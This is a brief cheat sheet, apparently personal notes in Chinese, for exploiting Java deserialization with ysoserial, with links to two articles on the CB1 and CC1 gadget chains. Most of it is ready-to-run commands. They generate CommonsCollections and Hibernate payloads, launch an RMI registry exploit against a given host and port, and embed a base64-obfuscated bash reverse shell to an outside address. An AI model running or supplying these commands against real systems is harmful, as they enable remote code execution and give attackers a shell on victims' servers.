[『代码审计』ysoserial CB1 反序列化分析](https://mp.weixin.qq.com/s/Pbxw79a1klGTwwYgeDhYqw)
[Java反序列化之CC1链](https://mp.weixin.qq.com/s/QKJnxPEMXkudM4Fvgzhl4A)

```bash
java -jar ysoserial-all.jar CommonsCollections3 "calc" > cc3.txt
java -jar ysoserial-all.jar CommonsCollections3 "calc" |base64 -w 0
java -jar ysoserial-all.jar CommonsCollections4 "bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMi4zLjQvMjIyMyAwPiYx}|{base64,-d}|{bash,-i}"|base64 -w 0
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 1.2.3.4 1099 CommonsCollections1 "calc.exe"



# 示例: hibernate-core-5.4.6.Final.jar这个包，利用ysoserial生成payload，执行以下命令
java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe > token.bin
## 可能需要 base64转码再转码用python发.
```